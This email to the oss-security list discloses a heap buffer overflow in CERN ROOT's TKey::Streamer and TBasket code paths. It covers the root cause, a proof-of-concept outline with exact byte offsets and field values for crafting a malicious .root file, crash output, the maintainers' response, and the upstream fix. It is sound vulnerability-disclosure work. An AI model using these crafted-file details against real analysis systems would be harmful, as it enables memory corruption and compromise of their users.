Received: (qmail 5388 invoked by uid 550); 24 May 2026 16:45:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 11303 invoked from network); 24 May 2026 15:07:29 -0000
ARC-Seal: i=1; a=rsa-sha256; t=1779635239; cv=none;
        d=google.com; s=arc-20240605;
        b=Gc46pQjbZddKOq2KyljSheN0eZmgZf2ZIXAgbijkLxV6J5XXIbmqkpq8BDLncj4ElN
         zI3I/RfvKJaHE7H6OJBUvowLdZiYfhWYwTZYKAaA6Eaqw/+DM6sNP5IGn76aUyQGczVp
         62MZ2CNkOf7O4w/RJRuOYwodeiNjTpT+kRfqVcYPQTaLJKEsGUjkn1t9TePiVV3F4T4x
         YATiskfTU9qgedamClh3raSY4xUOT8kG40CRxDhkwpNvpQtLMl1qTfDMczqu84YS4yho
         FH7w64yoR0peoAoXT9TEN6QAuTeeyl3qnBxdT2XoG1I61dPL0jQbtpUSU+2FoheQjN/H
         vFQA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=WOvB/LyGaI9XDdjm7Jq+jYe4hHB9lTXn7yjKkLTXbGk=;
        fh=9jsPTyo6edd9xvAeG+KFFrRrXMmgB/RdwUKOrvy9dcA=;
        b=UBP5notcW3S5Yk1faAFIJL2Bgyml/RV5d+6Lg6URJuvQEupUH3eTjCYsHMPo/a2c/a
         u9Ao2S01jXJ3yChJWlIV241lnRaODx3MyYJfrB3sT6bGTe0JvaFBonP2xB/gv/4TuXOK
         jZX0fwmj1V0D3qCjUsMOKhvjTp6iwCkpKl95udqw+OaEu9cCCAvW0JH8ZIKzVUBeMejL
         xxbn1CaE7RmrLVQSp1HFsDGhxTv+QNkwYLgO5ybViYsePIkppeezAEqkcDpf5hNHIeGA
         dNbp69/t5+lYaIVhWOZcOXbLMkiLN1agcMDjWwVcGelFUdtTE7Yrk9O4wCzwflqrXB+8
         q/9g==;
        darn=lists.openwall.com
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1779635239; x=1780240039; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=WOvB/LyGaI9XDdjm7Jq+jYe4hHB9lTXn7yjKkLTXbGk=;
        b=bARlYRFIln/KNaQKMeVvXdl0/qd19jk/BZhlUNHBZuUOef056LnvJre27OGtvlbn5f
         oPQu2vDxhXmu6JEe4dLP/hm2ExSrZGzegjcp/+GF7jTbw54HSD18/0A4zMYicP1Jzf38
         nZbxD4ZyK7pQcZucZhDNJX4Isg6wo1NcwHbuhAjLqBuEYV1MUt+xCYdCXR1AcVIoQB6j
         XccKXLndlRpTL9LSww0nsmfFqtlX3LtO31MSNuugPYSy4xzoPjmwJEPkTK6uvz0WEIcY
         l6+VhswS2gHkSGrbT2CbFF0Fw5h92riCZk4l12rdo7sQhDDvA0VPO9i6wXBq4iAztQx9
         3QjQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1779635239; x=1780240039;
        h=to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=WOvB/LyGaI9XDdjm7Jq+jYe4hHB9lTXn7yjKkLTXbGk=;
        b=cilxKsNLTmD8WrR+qG4Segw+xjleL303Pn98D1a4xpx+B6JwfnRis9qXvMYkZ6K5hy
         NfsJUCaX/d/ejVxZCfLskvvs3uJcIXi3NKRDX9OGppQAqohttFHWKgGc/t6SEuUuxTel
         dTSKFSajqgtiSGWE2tl7PUsiaqmKsLY4KTXx0/KlIr9cMczsc1PXrU8DKFULAPXecq8g
         +Y/hibdpFW5mMrJeOek/q8bRZsg8EjxXQpXzj6tSVUUbp4dxgb4RZRDW8o+ps5Nl3VZ8
         jmkGPaejxzjat99RJOvD9w+tJgN8aFBLNaJYcdp0zaATmLeFx3/8kowINZAcUD1FJXVP
         QCWA==
X-Gm-Message-State: AOJu0Ywfv2DqZRaLOPeGQTVIPWL3N4eg0T8SZS2Jz6sZ7aEB+mfvFePx
	hDuQBNDb7HrtNWMTB7vZ8PcqjY4kEsS2WXqaSUGfVj+a9F46TZYcvqh5J4U/hraRQYM5mhBSXLu
	ZEwlsM+/KLsDOZUaw6uvrgC0MrHof705oyCbE
X-Gm-Gg: Acq92OEkS6nVtyLNUtxHwfXaLkVqVpbolxfFtfskVURBFuXTFpEBk9z/fXcOpxnxcbn
	QiXcHNfW0pZ6foLs8MFNCcUHlGlrR1tOm+Cl/F12yoycSFEI82c2ecYaepv1/Vea6CzBbUGN+3x
	ItAoZI3k84MVfa/JwZorXZA04laBIdLfJypcYzXEve7gPuoOmTQENw/RCGxZ3CqEszgAIkeNl4k
	72dWY6SpGBVPiY6+nGBPzKQpcbiiO53byKYcatN1E1a3iB1uG6tbrQiSMKAtT6LJUXikZr6eIfp
	7MH5NCO75Ywl2m3tw0tBvgceHwRg8tbzHhkohVXzwfOjBqdpZDI4
X-Received: by 2002:a05:6a20:a121:b0:3a2:f14a:4275 with SMTP id
 adf61e73a8af0-3b328c4ef7amr11342365637.6.1779635239130; Sun, 24 May 2026
 08:07:19 -0700 (PDT)
MIME-Version: 1.0
From: Manopakorn Kooharueangrong <manopakorn.sec@gmail.com>
Date: Sun, 24 May 2026 22:07:07 +0700
X-Gm-Features: AVHnY4K2vy0TRQ7hIgV8JR4aXq94ThAtKhiC91Pe3cNb-2gG1ig0R_cJvKtSfB4
Message-ID: <CA+7nKoUW7p1=zC=b2C5j7+27jPtHRFyD-fo4BWO9AV4yndHLLA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="00000000000042199b0652919e8c"
Subject: [oss-security] root-project/root: Heap buffer overflow in TKey::Streamer / TBasket::ReadBasketBuffers

--00000000000042199b0652919e8c
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hello oss-security,

I am writing to report a confirmed memory safety vulnerability in
root-project/root (ROOT, the CERN C++ scientific computing framework)
version v6-40-00 and below. The issue was confirmed end-to-end against
the real ROOT library (v6-36-04, snap root-framework) with a
deterministic 3/3 reproducer.

I am requesting that you coordinate a CVE assignment. The maintainers
confirmed the bug and merged a fix, but declined to classify it as a
security advisory; I disagree for the reasons below.

=3D=3D Summary =3D=3D

Issue: Heap buffer overflow in TBasket::ReadBasketBuffers via missing
fObjlen + fKeylen additive-overflow check in TKey::Streamer. An
attacker-controlled .root file triggers up to 32,767 bytes of OOB read and
OOB write on the heap when opened by a victim process.
Affected versions: v6-00-00 through v6-40-00 (262 release tags ship the
vulnerable path).
CVSS 3.1: AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H =3D 7.8 (High)
CWE: CWE-20, CWE-122, CWE-190
Authentication required: None.
Fix: Merged upstream in PR #22377 =E2=80=94
https://github.com/root-project/root/pull/22377

=3D=3D Root cause =3D=3D

io/io/src/TKey.cxx:1375-1426 (TKey::Streamer) clamps fNbytes, fObjlen,
fKeylen to be non-negative but does not validate that fObjlen + fKeylen
fits in Int_t. The sibling routine TKey::ReadKeyBuffer at
io/io/src/TKey.cxx:1249-1254 does enforce this check (added in commit
2a596309bf, April 2026) but the fix was not propagated to Streamer until PR
#22377.

The unvalidated values flow to tree/tree/src/TBasket.cxx:583:

  uncompressedBufferLen =3D len > fObjlen+fKeylen ? len : fObjlen+fKeylen;

When fObjlen + fKeylen wraps to a negative value under signed overflow, the
small attacker-supplied len is chosen as the destination allocation size.
The subsequent memcpy at line 601 writes fKeylen bytes (up to 32,767, the
Short_t range) into the undersized buffer:

  memcpy(rawUncompressedBuffer, rawCompressedBuffer, fKeylen);

This is OOB read on the source and OOB write on the destination.

=3D=3D PoC =3D=3D

Reproducible 3/3 against ROOT v6-36-04 (snap root-framework). Steps:

  $ /snap/bin/root -l -b -q make_good.C   # writes good.root, one TTree,
one basket
  $ python3 patch_basket.py               # 6-byte patch to basket header
  $ /snap/bin/root -l -b -q trigger.C     # opens bad.root, calls
tree->GetEntry(0)

The patch overwrites two fields at file offset 0xde:
  fObjlen (offset 0xe4): 0x00000020 -> 0x7fff8001
  fKeylen (offset 0xec): 0x0041     -> 0x7fff (32767)
  Result: fObjlen + fKeylen =3D 0x80000000 (signed wrap to INT_MIN)

ROOT runtime output (smoking gun showing attacker values reaching the sink):

  Processing trigger.C...
  Error R__unzip_header: error in header.  Values: 00
  Error in <TBasket::ReadBasketBuffers>: Inconsistency found in header
(nin=3D0, nbuf=3D0)
  Error in <TBasket::ReadBasketBuffers>: fNbytes =3D 97, fKeylen =3D 32767,
fObjlen =3D 2147450881, noutot =3D 0, nout=3D0, nin=3D0, nbuf=3D0
  Error in <TBranch::GetBasket>: File: bad.root at byte:222, branch:x,
entry:0, badread=3D1, nerrors=3D1, basketnumber=3D0
  double free or corruption (!prev)

The middle line proves TKey::Streamer accepted fObjlen =3D 0x7fff8001 and
fKeylen =3D 0x7fff without raising. The glibc abort line is heap metadata
corruption from the memcpy at TBasket.cxx:601.

gdb backtrace at abort through real ROOT symbols:

  #3  __GI_abort ()
  #5  malloc_printerr (str=3D"double free or corruption (!prev)")
  #6  _int_free_merge_chunk (size=3D389952)
  #8  TBuffer::~TBuffer ()         from libCore.so
  #9  TBufferIO::~TBufferIO ()     from libRIO.so
  #10 TBufferFile::~TBufferFile () from libRIO.so
  #12 TBranch::~TBranch ()         from libTree.so
  #16 TTree::~TTree ()             from libTree.so
  #22 TFile::Close ()              from libRIO.so

Negative control: same flow against the original unpatched good.root prints
"x =3D 0" (the legitimate branch value) and exits cleanly with no glibc abo=
rt
and no error messages.

=3D=3D Maintainer response =3D=3D

The bug was confirmed by @dpiparo on the GHSA-58gv-q2vp-fv8f draft advisory:

  "We confirm a crafted ROOT file could trigger the bug. Now, in
  presence of a tampered input, a crash would occur. Checks were put
  in place thanks to your report, see #22377 and backports."

The advisory was closed with: "We don't consider this item a security
advisory."

I disagree because:

1. It is a confirmed heap buffer overflow (CWE-122) triggered by integer
overflow (CWE-190) on attacker-controlled bytes parsed from a file. This
matches standard CVE criteria for a memory safety issue in a parser.

2. ROOT is routinely used to open files from multi-tenant and
network-reachable sources: CERN SWAN, JupyterLab-ROOT, batch hadd workers,
XRootD/EOS/CernVM-FS grid storage, CI artifacts, and downstream frameworks
(CMSSW, Gaudi, Athena). A single crafted .root file delivered to any of
these surfaces can compromise a long-running, grid-credentialed analysis
process.

3. The ~32 KB OOB write spans many glibc heap chunks and provides a
primitive for vtable or function-pointer overwrite, not just a crash.

=3D=3D Recommended fix (matches upstream PR #22377) =3D=3D

In io/io/src/TKey.cxx (TKey::Streamer), mirror the check that already
exists in TKey::ReadKeyBuffer:

  constexpr auto maxInt_t =3D std::numeric_limits<Int_t>::max();
  if (fKeylen > (maxInt_t - fObjlen)) {
     Error("Streamer", "fObjlen (%d) + fKeylen (%d) > max int (%d)",
           fObjlen, fKeylen, maxInt_t);
     MakeZombie();
     return;
  }

Defence-in-depth: in tree/tree/src/TBasket.cxx, assert fKeylen <=3D len and
fKeylen <=3D uncompressedBufferLen before the memcpy at line 601.

=3D=3D Credit =3D=3D

Please credit: manop55555 (https://github.com/manop55555), Finder /
Reporter.

=3D=3D Disclosure =3D=3D

The fix is already public via PR #22377. I plan to publish this advisory
once a CVE is assigned, or after 90 days from today if no CVE is assigned.
Please acknowledge receipt.

=3D=3D References =3D=3D

Upstream fix (merged): https://github.com/root-project/root/pull/22377
Sibling-fix commit: 2a596309bf (TKey::ReadKeyBuffer hardening, April 2026)
Vulnerable files: io/io/src/TKey.cxx (TKey::Streamer, lines 1375-1426)
tree/tree/src/TBasket.cxx (TBasket::ReadBasketBuffers, line 601)
Affected range: v6-00-00 through v6-40-00
Closed GHSA draft: GHSA-58gv-q2vp-fv8f (root-project/root)

Best regards,
manop55555

--00000000000042199b0652919e8c--
